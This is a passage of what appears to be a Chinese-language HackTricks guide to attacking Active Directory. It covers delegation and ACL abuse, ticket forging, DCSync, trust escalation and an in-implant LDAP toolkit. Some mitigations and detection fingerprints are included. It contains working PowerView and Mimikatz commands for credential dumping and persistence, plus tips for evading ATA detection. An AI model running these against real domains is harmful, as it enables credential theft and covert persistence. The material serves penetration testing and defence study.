### MSSQL Abuse & Trusted Links

如果用户拥有 **访问 MSSQL 实例** 的权限，就可能利用该权限在 MSSQL 主机上 **执行命令**（如果实例以 SA 身份运行）、**窃取** NetNTLM **哈希**，甚至执行 **relay attack**。\
如果某个 MSSQL 实例通过数据库链接受到另一个实例的信任，那么拥有被链接数据库权限的用户可能能够 **利用信任关系在另一个实例上执行查询**。这些信任关系可以串联起来，最终可能到达一个配置不当的数据库，让用户能够执行命令。\
**数据库之间的链接即使跨越 forest trust 也能正常工作。**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### IT 资产/部署平台 Abuse

第三方资产清点和部署套件通常会暴露可用于获取凭据和执行代码的强大途径。请参阅：

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

如果发现某个 Computer 对象具有 [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) 属性，并且你在该计算机上拥有域权限，就可以从内存中转储所有登录过该计算机的用户的 TGT。\
因此，如果 **Domain Admin 登录该计算机**，你就可以转储其 TGT，并使用 [Pass the Ticket](pass-the-ticket.md) 冒充该用户。\
借助 constrained delegation，你甚至可以 **自动攻陷打印服务器**（但愿它是 DC）。


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

如果某个用户或计算机被允许使用“Constrained Delegation”，就能 **冒充任意用户以访问计算机上的某些服务**。\
因此，如果你 **攻陷了该用户/计算机的哈希**，就能 **冒充任意用户**（甚至是域管理员）来访问某些服务。


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

对远程计算机的 Active Directory 对象拥有 **WRITE** 权限，即可获得以 **提升的权限** 执行代码的能力：


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### 权限/ACL Abuse

被攻陷的用户可能对某些域对象拥有一些 **有价值的权限**，从而让你能够横向 **移动**/**提升** 权限。


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Print Spooler 服务 Abuse

如果发现域内有 **正在监听的 Spool 服务**，就可以利用它来 **获取新凭据** 并 **提升权限**。


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### 第三方会话 Abuse

如果 **其他用户** **访问** 了这台 **已被攻陷** 的计算机，就可能 **从内存中收集凭据**，甚至 **向他们的进程注入 beacon** 来冒充他们。\
用户通常会通过 RDP 访问系统，下面介绍如何针对第三方 RDP 会话执行几种攻击：


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS** 提供了一套用于管理加入域的计算机上 **本地 Administrator 密码** 的系统，确保密码经过 **随机化**、彼此唯一，并会频繁 **更改**。这些密码存储在 Active Directory 中，并通过 ACL 控制访问权限，仅授权用户可以访问。拥有足够权限来访问这些密码后，就可以横向转移到其他计算机。


{{#ref}}
laps.md
{{#endref}}

### Certificate Theft

从已被攻陷的计算机中 **收集证书**，可能是提升环境内权限的一种方式：


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Certificate Templates Abuse

如果配置了 **易受攻击的模板**，就可以利用它们来提升权限：


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## 高权限账户的 Post-exploitation

### 转储域凭据

获得 **Domain Admin**，或更好的 **Enterprise Admin** 权限后，就可以 **转储** **域数据库**：_ntds.dit_。

[**有关 DCSync attack 的更多信息，请参阅此处**](dcsync.md)。

[**有关如何窃取 NTDS.dit 的更多信息，请参阅此处**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

包含 `ntds.dit` 和 `SYSTEM` hive 的可读备份存档，在提取之前就应视为已暴露的目录材料。密码哈希过期，并不意味着对象的其他属性就是安全的：`description` 等字段可能包含凭据或操作说明。先检查存档成员名称，并避免将提取出的数据库内容放入常规枚举输出中。

### 将 Privesc 用于 Persistence

前面讨论的一些技术可以用于 Persistence。\
例如，你可以：

- 让用户容易受到 [**Kerberoast**](kerberoast.md) 攻击。

  ```bash
  Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
  ```

- 使用户易受 [**ASREPRoast**](asreproast.md) 攻击

  ```bash
  Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
  ```

- 向用户授予 [**DCSync**](#dcsync) 权限

  ```bash
  Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
  ```

### Silver Ticket

**Silver Ticket attack** 会利用 **NTLM hash**（例如 **PC account 的 hash**），为特定服务创建一张**合法的 Ticket Granting Service (TGS) ticket**。这种方法用于**访问该服务的权限**。


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

**Golden Ticket attack** 指攻击者获取 Active Directory (AD) 环境中 **krbtgt account 的 NTLM hash**。该 account 很特殊，因为它用于签署所有 **Ticket Granting Tickets (TGTs)**，而 TGT 是在 AD 网络内进行身份验证的必要凭证。

获取该 hash 后，攻击者就能为任意 account 创建 **TGTs**（Silver ticket attack）。


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

这类 ticket 类似于 Golden Ticket，但其伪造方式可以**绕过常见的 Golden Ticket 检测机制**。


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Certificates Account Persistence**

**拥有某个 account 的 certificates 或能够申请这些 certificates**，是让攻击者持续访问该用户 account 的有效方式（即使用户更改了密码）：


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Certificates Domain Persistence**

**也可以利用 certificates 在 domain 内以高权限维持持久化：**


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### AdminSDHolder Group

Active Directory 中的 **AdminSDHolder** 对象会通过对**特权组**（如 Domain Admins 和 Enterprise Admins）应用统一的 **Access Control List (ACL)**，防止未经授权的更改，从而确保这些组的安全。不过，这项功能也可能被滥用：如果攻击者修改 AdminSDHolder 的 ACL，授予普通用户完全访问权限，该用户就能广泛控制所有特权组。因此，这项原本用于保护的安全措施也可能适得其反；若不加以密切监控，就会导致不当访问。

[**点击此处了解有关 AdminDSHolder Group 的更多信息。**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM Credentials

每个 **Domain Controller (DC)** 上都存在一个**本地管理员** account。取得该计算机的管理员权限后，可以使用 **mimikatz** 提取本地 Administrator hash。之后需要修改注册表，才能**启用该密码**，从而远程访问本地 Administrator account。


{{#ref}}
dsrm-credentials.md
{{#endref}}

### ACL Persistence

你可以为某个**用户**授予对特定 domain 对象的**特殊权限**，使该用户能够在未来**提升权限**。


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Security Descriptors

**Security descriptors** 用于**存储**一个**对象**对另一个**对象**拥有的**权限**。只要能对某个对象的 **security descriptor** 做出**少量更改**，就能获得对该对象非常有价值的权限，而无需加入特权组。


{{#ref}}
security-descriptors.md
{{#endref}}

### Dynamic Objects Anti-Forensics / Evasion

滥用 `dynamicObject` 辅助类，创建带有 `entryTTL`/`msDS-Entry-Time-To-Die` 的短期 principal/GPO/DNS 记录；它们会自行删除且不留下 tombstone，从而抹除 LDAP 证据，同时留下孤立的 SID、损坏的 `gPLink` 引用或缓存的 DNS 响应（例如污染 AdminSDHolder ACE，或恶意修改 `gPCFileSysPath`/AD 集成 DNS 重定向）。

{{#ref}}
ad-dynamic-objects-anti-forensics.md
{{#endref}}

### Skeleton Key

在内存中修改 **LSASS** 以设置一个**通用密码**，从而获得访问所有 domain accounts 的权限。


{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[点击此处了解什么是 SSP (Security Support Provider)。](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
你可以创建**自己的 SSP**，以**明文**形式**捕获**用于访问该计算机的**凭据**。


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

它会在 AD 中注册一个**新的 Domain Controller**，并利用它向指定对象**推送属性**（SIDHistory、SPNs 等），而不会留下任何与这些**修改**相关的**日志**。你**需要 DA** 权限，并且必须位于 **root domain** 内。\
请注意，如果使用了错误的数据，可能会留下非常明显的日志。

{{#ref}}
dcshadow.md
{{#endref}}

### LAPS Persistence

之前我们讨论过，如果你有**足够权限读取 LAPS passwords**，如何提升权限。不过，这些密码也可以用于**维持持久化**。\
请参阅：


{{#ref}}
laps.md
{{#endref}}

## Forest 权限提升 - Domain Trusts

Microsoft 将 **Forest** 视为安全边界。这意味着**攻陷单个 domain 就可能导致整个 Forest 被攻陷**。<sup>[[1]](#references)</sup>

### 基本信息

[**Domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) 是一种安全机制，允许一个 **domain** 中的用户访问另一个 **domain** 中的资源。它会在两个 domain 的身份验证系统之间建立连接，使身份验证验证流程能够顺畅进行。domain 建立 trust 时，会在各自的 **Domain Controllers (DCs)** 中交换并保存特定的 **keys**，这些 keys 对维持 trust 的完整性至关重要。

通常，用户若要访问**受信任 domain** 中的服务，必须先向自己 domain 的 DC 请求一种称为 **inter-realm TGT** 的特殊 ticket。该 TGT 使用两个 domain 共同认可的 **key** 加密。随后，用户将此 TGT 提交给**受信任 domain 的 DC**，以获取服务 ticket（**TGS**）。受信任 domain 的 DC 成功验证 inter-realm TGT 后，会签发 TGS，授予用户访问该服务的权限。

**步骤**：

1. **Domain 1** 中的**客户端计算机**使用其 **NTLM hash** 向 **Domain Controller (DC1)** 请求 **Ticket Granting Ticket (TGT)**，启动整个流程。
2. 如果客户端通过身份验证，DC1 就会签发新的 TGT。
3. 随后，客户端向 DC1 请求 **inter-realm TGT**，以便访问 **Domain 2** 中的资源。
4. 作为两个 domain 之间双向 domain trust 的一部分，inter-realm TGT 使用 DC1 和 DC2 共享的 **trust key** 加密。
5. 客户端将 inter-realm TGT 提交给 **Domain 2 的 Domain Controller (DC2)**。
6. DC2 使用共享的 trust key 验证 inter-realm TGT；若验证有效，则为客户端要访问的 Domain 2 中的服务器签发 **Ticket Granting Service (TGS)**。
7. 最后，客户端将此 TGS 提交给服务器。该 TGS 使用服务器 account 的 hash 加密，客户端由此获得访问 Domain 2 中服务的权限。

### 不同的 trust 类型

需要注意的是，**trust 可以是单向或双向的**。双向 trust 中，两个 domain 会互相信任；而在**单向** trust 关系中，一个 domain 是**受信任方**，另一个是**信任方**。在后一种情况下，**只能从受信任方访问信任方中的资源**。

如果 Domain A 信任 Domain B，那么 A 是信任方，B 是受信任方。此外，在 **Domain A** 中，这属于 **Outbound trust**；在 **Domain B** 中，则属于 **Inbound trust**。

**不同的 trust 关系**

- **Parent-Child Trusts**：这是同一 forest 内常见的配置，子 domain 会自动与其父 domain 建立双向、可传递的 trust。也就是说，身份验证请求可以在父 domain 和子 domain 之间顺畅传递。
- **Cross-link Trusts**：也称为“shortcut trusts”，用于在子 domain 之间建立 trust，以加快 referral 流程。在复杂的 forest 中，身份验证 referral 通常必须先向上到达 forest root，再向下传递到目标 domain。建立 cross-links 可以缩短这一流程，在地理位置分散的环境中尤其有用。
- **External Trusts**：这类 trust 建立在不同且互不相关的 domain 之间，并且本身不可传递。根据 [Microsoft 的文档](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>)，external trusts 适用于访问当前 forest 之外、且未通过 forest trust 连接的 domain 中的资源。External trusts 通过 SID filtering 增强安全性。
- **Tree-root Trusts**：这类 trust 会在 forest root domain 与新添加的 tree root 之间自动建立。虽然不常见，但它对于向 forest 添加新的 domain tree 很重要，可使其保留唯一的 domain name，并确保 trust 为双向可传递。更多信息请参阅 [Microsoft 指南](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>)。
- **Forest Trusts**：这类 trust 是两个 forest root domains 之间双向可传递的 trust，同时通过 SID filtering 加强安全措施。
- **MIT Trusts**：这类 trust 与非 Windows、[符合 RFC4120 标准](https://tools.ietf.org/html/rfc4120)的 Kerberos domains 建立。MIT trusts 用途较为专门，适用于需要与 Windows 生态系统之外的 Kerberos 系统集成的环境。

#### **trust 关系**的其他区别

- Trust 关系可以是**可传递的**（A 信任 B，B 信任 C，则 A 信任 C），也可以是**不可传递的**。
- Trust 关系可以设置为**双向 trust**（双方互相信任）或**单向 trust**（其中一方信任另一方）。

### 攻击路径

1. **枚举** trust 关系
2. 检查是否有任何**安全主体**（用户/组/计算机）能够**访问** **另一个 domain** 的资源，例如通过 ACE 条目，或加入另一个 domain 的组。查找**跨 domain 的关系**（这很可能就是建立 trust 的原因）。
   1. 在这种情况下，kerberoast 也可能是另一种选择。
3. **攻陷**能够跨 domain **横向移动**的**accounts**。

攻击者可以通过以下三种主要机制访问另一个 domain 中的资源：

- **本地组成员身份**：安全主体可能被添加到计算机上的本地组中，例如服务器上的“Administrators”组，从而获得对该计算机的强大控制权。
- **外部 Domain 组成员身份**：安全主体也可以是外部 domain 中某个组的成员。不过，这种方法是否有效，取决于 trust 的性质和该组的范围。
- **Access Control Lists (ACLs)**：安全主体可能会被列入 **ACL**，特别是作为 **DACL** 中的 **ACEs**，从而获得对特定资源的访问权限。若想深入了解 ACL、DACL 和 ACE 的运作机制，白皮书 “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)” 是非常有价值的资料。<sup>[[17]](#references)</sup>

### 查找具有权限的外部用户/组

你可以检查 **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`**，以查找 domain 中的外部安全主体。这些主体是来自**外部 domain/forest** 的用户/组。

你可以在 **Bloodhound** 中检查，也可以使用 powerview：

```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```

### Child-to-Parent forest privilege escalation

```bash
# From PowerView
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```

枚举域信任的其他方法：

```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```

> [!WARNING]
> 有 **2 个受信任密钥**，一个用于 _Child --> Parent_，另一个用于 _Parent_ --> _Child_。\
> 你可以使用以下命令查看当前域使用的密钥：
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

利用 SID-History injection 滥用信任关系，将权限提升为子域/父域的 Enterprise admin：


{{#ref}}
sid-history-injection.md
{{#endref}}

#### 利用可写的 Configuration NC

了解如何利用 Configuration Naming Context (NC) 至关重要。在 Active Directory (AD) 环境中，Configuration NC 是整个林的配置数据中央存储库。这些数据会复制到林中的每个 Domain Controller (DC)，其中可写 DC 会保留 Configuration NC 的可写副本。要利用这一点，必须在某个 DC 上拥有 **SYSTEM 权限**，最好是在子域 DC 上。

**将 GPO 链接到根 DC 站点**

Configuration NC 的 Sites 容器包含 AD 林中所有已加入域的计算机的站点信息。攻击者在任意 DC 上拥有 SYSTEM 权限后，就可以将 GPO 链接到根 DC 站点。此操作可能通过操纵应用于这些站点的策略来攻陷根域。

有关深入信息，可以参考 [绕过 SID Filtering](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4) 相关研究。<sup>[[12]](#references)</sup>

**攻陷林中的任意 gMSA**

一种攻击途径是以域中的特权 gMSA 为目标。用于计算 gMSA 密码的 KDS Root key 存储在 Configuration NC 中。在任意 DC 上拥有 SYSTEM 权限后，就可以访问 KDS Root key，并计算整个林中任意 gMSA 的密码。

详细分析和分步指南请参阅：


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

补充的委派 MSA 攻击（BadSuccessor – 滥用迁移属性）：

 
{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

其他外部研究：[Golden gMSA Trust Attacks](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-5)。<sup>[[13]](#references)</sup>

**Schema 更改攻击**

这种方法需要耐心等待新的特权 AD 对象创建。攻击者拥有 SYSTEM 权限后，可以修改 AD Schema，授予任意用户对所有类的完全控制权。这可能导致未经授权地访问和控制新创建的 AD 对象。

更多内容请参阅 [Schema Change Trust Attacks](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-6)。<sup>[[14]](#references)</sup>

**通过 ADCS ESC5 从 DA 提升为 EA**

ADCS ESC5 漏洞针对 Public Key Infrastructure (PKI) 对象的控制权限，攻击者可借此创建一个证书模板，从而能够以林中任意用户的身份进行身份验证。由于 PKI 对象位于 Configuration NC 中，攻陷可写的子域 DC 后即可执行 ESC5 攻击。

更多详情请参阅 [通过 ESC5 从 DA 提升为 EA](https://specterops.io/blog/2023/05/16/from-da-to-ea-with-esc5/)。<sup>[[15]](#references)</sup> 如果环境中没有 ADCS，攻击者也可以搭建所需组件，具体讨论见[从子域管理员提升为 Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/)。<sup>[[16]](#references)</sup>

### 外部林域 - 单向（入站）或双向

```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```

在此场景中，外部域信任**你的域**，并赋予你的域对其**未确定的权限**。你需要找出**你的域中的哪些主体对外部域拥有哪些访问权限**，然后尝试利用这些权限：


{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### 外部林域 - 单向（出站）

```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```

在这种场景中，**你的域**会将某些**权限**授予来自**其他域**的主体。

但是，当某个域被信任域**信任**时，受信任域会**创建一个用户**，其**名称可预测**，并且**密码使用受信任密码**。这意味着，可以**访问信任域中的一个用户，进而进入受信任域**，对其进行枚举并尝试提升更多权限：


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

另一种攻陷受信任域的方法，是找到一个创建于域信任**相反方向**的 [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links)（这种情况并不常见）。

另一种攻陷受信任域的方法，是在一台**受信任域用户能够登录**的机器上等待其通过 **RDP** 登录。然后，攻击者可以将代码注入 RDP 会话进程，并从那里**访问受害者的源域**。\
此外，如果**受害者挂载了自己的硬盘**，攻击者可以通过 **RDP 会话**进程，在该硬盘的**启动文件夹**中存放**后门**。这种技术称为 **RDPInception。**


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### 域信任滥用缓解措施

### **SID Filtering：**

- 利用 SID history 属性跨林信任发起攻击的风险，可通过 SID Filtering 缓解。所有林间信任默认启用该功能。这基于一个假设：林内信任是安全的；按照 Microsoft 的观点，安全边界是林，而不是域。
- 但需要注意：SID filtering 可能会导致应用程序和用户访问中断，因此有时会被停用。

### **Selective Authentication：**

- 对于林间信任，使用 Selective Authentication 可确保两个林中的用户不会自动通过身份验证。相反，用户必须获得明确授权，才能访问信任域或林中的域和服务器。
- 需要注意的是，这些措施无法防范对可写 Configuration Naming Context (NC) 的利用，也无法防范针对信任账户的攻击。

[**在 ired.team 上了解有关域信任的更多信息。**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)<sup>[[3]](#references)</sup>

## 基于 LDAP 的 AD 滥用：来自主机内 Implant

[LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) 将 bloodyAD 风格的 LDAP 原语重新实现为 x64 Beacon Object Files，可在主机内 Implant（例如 Adaptix C2）中完全运行。操作人员使用 `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make` 编译该工具包，加载 `ldap.axs`，然后在 beacon 中调用 `ldap <subcommand>`。所有流量都通过当前登录安全上下文使用 LDAP (389) 并启用签名/封装，或使用 LDAPS (636) 并自动信任证书，因此无需 socks 代理或磁盘文件。<sup>[[4]](#references)</sup>

### Implant 端 LDAP 枚举

- `get-users`、`get-computers`、`get-groups`、`get-usergroups` 和 `get-groupmembers` 会将短名称/OU 路径解析为完整 DN，并导出相应对象。
- `get-object`、`get-attribute` 和 `get-domaininfo` 会提取任意属性（包括安全描述符），以及来自 `rootDSE` 的林/域元数据。
- `get-uac`、`get-spn`、`get-delegation` 和 `get-rbcd` 可直接从 LDAP 中显示可用于 roasting 的目标、委派设置，以及现有的 [基于资源的约束委派](resource-based-constrained-delegation.md) 描述符。
- `get-acl` 和 `get-writable --detailed` 会解析 DACL，以列出受托人、权限（GenericAll/WriteDACL/WriteOwner/属性写入）和继承关系，从而快速确定 ACL 权限提升的目标。

```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```

### 用于提权与持久化的 LDAP 写入原语

- 对象创建 BOF（`add-user`、`add-computer`、`add-group`、`add-ou`）可让操作者在拥有 OU 权限的位置创建新主体或计算机账户。找到写属性权限后，`add-groupmember`、`set-password`、`add-attribute` 和 `set-attribute` 可直接劫持目标。
- 面向 ACL 的命令（如 `add-ace`、`set-owner`、`add-genericall`、`add-genericwrite` 和 `add-dcsync`）可将 AD 对象上的 WriteDACL/WriteOwner 权限转化为密码重置、组成员控制或 DCSync 复制权限，且不会留下 PowerShell/ADSI 痕迹。对应的 `remove-*` 命令可清理注入的 ACE。

### 委派、roasting 与 Kerberos 滥用

- `add-spn`/`set-spn` 可立即使被攻陷的用户变为 Kerberoastable；`add-asreproastable`（UAC 开关）可在不更改密码的情况下将其标记为可进行 AS-REP roasting。
- 委派宏（`add-delegation`、`set-delegation`、`add-constrained`、`add-unconstrained`、`add-rbcd`）可从 beacon 改写 `msDS-AllowedToDelegateTo`、UAC 标记或 `msDS-AllowedToActOnBehalfOfOtherIdentity`，启用受限/非受限/RBCD 攻击路径，并省去远程 PowerShell 或 RSAT。

### sidHistory 注入、OU 迁移与攻击面塑造

- `add-sidhistory` 可将特权 SID 注入受控主体的 SID 历史记录（参见 [SID-History 注入](sid-history-injection.md)），完全通过 LDAP/LDAPS 实现隐蔽的访问继承。
- `move-object` 可更改计算机或用户的 DN/OU，使攻击者能先将资产移入委派权限范围，再使用 `set-password`、`add-groupmember` 或 `add-spn`。有关移动权限和继承检查，参见 [OU 迁移与继承权限](acl-persistence-abuse/#moving-an-object-into-inherited-ou-permissions)。
- 范围严格的移除命令（`remove-attribute`、`remove-delegation`、`remove-rbcd`、`remove-uac`、`remove-groupmember` 等）可让操作者在获取凭据或建立持久化后快速回滚，尽量减少遥测痕迹。

## AD -> Azure 与 Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## 一些通用防御措施

[**了解如何保护凭据。**](../stealing-credentials/credentials-protections.md)

### **凭据保护的防御措施**

- **限制 Domain Admins**：建议仅允许 Domain Admins 登录 Domain Controller，避免在其他主机上使用其账户。
- **服务账户权限**：服务不应以 Domain Admin（DA）权限运行，以确保安全。
- **限制特权有效时间**：需要 DA 权限的任务应尽量缩短执行时间。可通过以下方式实现：`Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **缓解 LDAP relay**：审计事件 ID 2889/3074/3075，然后在 DC/客户端上强制启用 LDAP signing 和 LDAPS channel binding，以阻止 LDAP MITM/relay 尝试。

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### Impacket 活动的协议级指纹识别

若要检测常见的 AD 技术手法，**不要只依赖操作者可控的痕迹**，例如重命名的二进制文件、服务名称、临时批处理文件或输出路径。建立合法 Windows 客户端生成 [Kerberos](kerberos-authentication.md)、[NTLM](../ntlm/README.md)、SMB、LDAP、DCE/RPC 和 WMI 流量的基线，然后查找即使操作者修改了 `psexec.py`、`wmiexec.py`、`dcomexec.py`、`atexec.py` 或 `ntlmrelayx.py` 仍会保留的**实现特征**。<sup>[[8]](#references)</sup>

- **高置信度的独立检测候选项**（需先根据自身基线验证）：
  - 使用 `auth_context_id = 79231 + ctx_id` 的已认证 DCE/RPC
  - 填充为 `0xff` 的 DCE/RPC 身份验证填充
  - LDAP Kerberos bind 将原始 Kerberos `AP-REQ` 直接放入 SPNEGO `mechToken`
  - `ClientGuid` 值看起来像 ASCII 字符的 SMB2/3 negotiate 请求
  - WMI `IWbemLevel1Login::NTLMLogin` 使用非标准命名空间 `//./root/cimv2`
  - 硬编码的 Kerberos nonce 值
- **更适合作为关联/评分特征**：
  - 稀疏或重复的 Kerberos etype 列表、异常/缺失的 `PA-DATA`，或与原生 Windows 不同的 TGS-REQ etype 排序
  - 缺少版本信息的 NTLM Type 1 消息，或主机名为空的 Type 3 消息
  - 在 DCE/RPC 中传输原始 NTLMSSP 而非 SPNEGO、缺少 DCE/RPC verification trailer，或 SPNEGO/Kerberos OID 不匹配
  - 同一主机/用户/会话/时间窗口出现多项此类特征，远比任何单一的弱特征更有力
- **用作补充信息，不要单独触发告警**：
  - 默认文件名、输出路径、随机服务名称、临时批处理名称、默认计算机账户名称，以及特定工具使用的 HTTP/WebDAV/RDP/MSSQL 字符串
  - 操作者很容易更改这些内容，因此最好用它们来解释为何跨协议行为集群可疑
- **操作说明**：
  - 某些信号需要解密流量、[PCAP/Zeek 解析](../../generic-methodologies-and-resources/basic-forensic-methodology/pcap-inspection/README.md)、ETW 或服务端可视性
  - 将这些信号提升为告警前，先根据 Samba/Linux 客户端、设备和旧版软件进行验证
  - 随着对基线的信心提升，逐步将检测从补充信息提升至威胁搜寻，再提升至告警

### **实施 Deception 技术**

- 实施 deception 时，可设置诱饵，例如具有永不过期密码或标记为 Trusted for Delegation 的诱饵用户或计算机。具体方法包括创建具有特定权限的用户，或将其加入高权限组。<sup>[[2]](#references)</sup>
- 一个实际示例是使用以下工具：`Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- 有关部署 deception 技术的更多信息，请参见 GitHub 上的 [Deploy-Deception](https://github.com/samratashok/Deploy-Deception)。

### **识别 Deception**

- **用户对象**：可疑迹象包括异常的 ObjectSID、较少的登录记录、创建日期以及较低的错误密码计数。
- **一般迹象**：将潜在诱饵对象的属性与真实对象进行比较，可能发现不一致之处。[HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) 等工具可帮助识别此类 deception。

### **绕过检测系统**

- **绕过 Microsoft ATA 检测**：
  - **用户枚举**：避免在 Domain Controller 上枚举会话，以防触发 ATA 检测。
  - **票据冒充**：使用 **aes** 密钥创建票据，可避免降级为 NTLM，从而帮助规避检测。
  - **DCSync 攻击**：建议从非 Domain Controller 执行，以避免 ATA 检测；直接从 Domain Controller 执行会触发告警。

## References

- [1] [攻击域信任指南](https://blog.harmj0y.net/redteaming/a-guide-to-attacking-domain-trusts/)
- [2] [在 Active Directory 中伪造信任以实施 Deception](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [3] [从 Domain Admin 到 Enterprise Admin](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [4] [LDAP BOF 集合——用于 Active Directory 利用的内存 LDAP 工具包](https://github.com/P0142/LDAP-Bof-Collection)
- [5] [TrustedSec – Holy Shuck！将 NTLM Hash 武器化为字典](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [6] [Barbhack 2025 CTF（NetExec AD Lab）——Pirates](https://0xdf.gitlab.io/2026/01/29/barbhack-2025-ctf.html)
- [7] [Hashcat](https://github.com/hashcat/hashcat)
- [8] [ThatTotallyRealMyth/Impacket-IoCs——剖析 Impacket](https://github.com/ThatTotallyRealMyth/Impacket-IoCs)
- [9] [rub-softsec/onelogon - Onelogon：通过 Netlogon 接管 Active Directory 账户](https://github.com/rub-softsec/onelogon)
- [10] [Microsoft - 如何管理与 CVE-2020-1472 相关的 Netlogon 安全通道连接变更](https://support.microsoft.com/en-us/topic/how-to-manage-the-changes-in-netlogon-secure-channel-connections-associated-with-cve-2020-1472-f7e8cc17-0309-1d6a-304e-5ba73cd1a11e)
- [11] [探寻被遗忘的 Null Session 与 MS-RPC 接口](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
- [12] [SID filter 是域之间的安全边界吗？（第 4 部分）——绕过 SID filtering 研究](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)
- [13] [SID filter 是域之间的安全边界吗？（第 5 部分）——Golden GMSA 信任攻击：从子域到父域](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-5)
